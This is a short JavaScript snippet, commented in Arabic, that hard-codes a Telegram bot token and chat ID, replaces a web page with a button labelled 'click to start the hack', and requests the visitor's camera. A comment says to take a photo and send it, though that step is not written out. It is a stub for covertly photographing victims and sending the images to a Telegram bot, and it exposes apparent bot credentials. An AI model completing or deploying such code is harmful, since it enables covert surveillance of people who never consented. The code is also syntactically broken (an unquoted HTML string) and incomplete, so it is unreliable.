
const BOT_TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
const CHAT_ID = "7984067238";

document.body.innerHTML =  <button id="go" style="padding:20px">انقر لبدء الاختراق</button> ;
document.getElementById("go").onclick = async () => {
    // طلب الكاميرا
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        // ... التقط صورة وأرسلها
        alert("تم التصوير");
    } catch(e) { alert("خطأ: "+e.message); }
};
